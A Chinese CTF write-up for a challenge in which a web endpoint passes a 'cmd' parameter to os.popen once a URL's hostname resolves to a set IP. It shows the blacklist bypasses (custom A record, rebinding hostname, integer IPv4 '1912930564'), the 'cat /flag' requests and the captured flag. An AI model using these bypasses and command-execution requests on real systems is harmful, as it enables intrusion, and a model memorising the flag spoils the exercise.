# DNS 想要玩

## 题目简述

接口先用字符串黑名单检查 `url`，再把其中的主机名解析为 IPv4；只要结果等于 `114.5.1.4`，就把另一个参数 `cmd` 原样交给 `os.popen()`。虽然题名和原解提到 DNS Rebinding，但源码只有一次 DNS 解析，之后也没有请求该 URL，因此严格说这是“用主机名解析结果作为命令执行条件”，不是经典的 SSRF 或 DNS 重绑定。

## 解题过程

关键逻辑为：

```python
def check(url):
    host = urlparse(url).hostname
    host_ascii = host.encode('idna').decode('utf-8')
    return socket.gethostbyname(host_ascii) == '114.5.1.4'

if check(raw_url):
    return os.popen(request.args.get('cmd')).read()
```

黑名单禁止原始 URL 中直接出现 `114.5.1.4`，但不禁止解析后指向该地址的其他主机表示。最符合题意的方法是准备一个不含黑名单子串的域名，并把其 A 记录固定设为 `114.5.1.4`：

```text
/ssrf?url=http://a.example/&cmd=cat%20/flag
```

原 PDF 使用的轮换 DNS 主机名把两个 IPv4 地址分别编码为八位十六进制：`72050104` 对应 `114.5.1.4`，`c0a80002` 对应 `192.168.0.2`。该服务会在两个结果间切换；由于程序只解析一次，请求仅在这一次恰好返回 `114.5.1.4` 时成功，重试只是弥补随机性，并不存在“检查时一个地址、使用时另一个地址”的重绑定过程。

原文附有 [DNS Rebinding 背景文章](https://zhuanlan.zhihu.com/p/89426041) 和 [rbndr.us 主机名生成器](https://lock.cmpxchg8b.com/rebinder.html)。生成器的关键行为就是把两个地址编码进主机名，并以很低 TTL 随机返回其中之一；这一必要信息已经写入上段，不需要依赖外链理解本题。

还可以完全绕开外部 DNS。Linux 的 IPv4 解析兼容单整数表示，而：

```text
int(IPv4Address('114.5.1.4')) = 1912930564
socket.gethostbyname('1912930564') = '114.5.1.4'
```

因此可用确定性的非预期请求：

```text
/ssrf?url=http://1912930564/&cmd=cat%20/flag
```

原始 URL 不含被过滤的点分十进制地址，解析结果却满足 `check()`。`cmd` 随即进入 shell，读取仓库 `Dockerfile` 写入的 `/flag`，得到：

```text
0xGame{DNS_Rebinding_is_Really_Magical}
```

## 方法总结

- 判断 DNS Rebinding 不能只看“域名返回多个 IP”，还要存在至少两个解析/使用时点；本题只有一次解析。
- 对 IP 黑名单要测试域名、整数 IPv4、十六进制或缩写 IPv4 等等价表示，不能只比较原始字符串。
- 最大漏洞是解析成功后直接执行 `cmd`。URL 在这里没有被访问，只是充当打开命令执行分支的校验令牌。
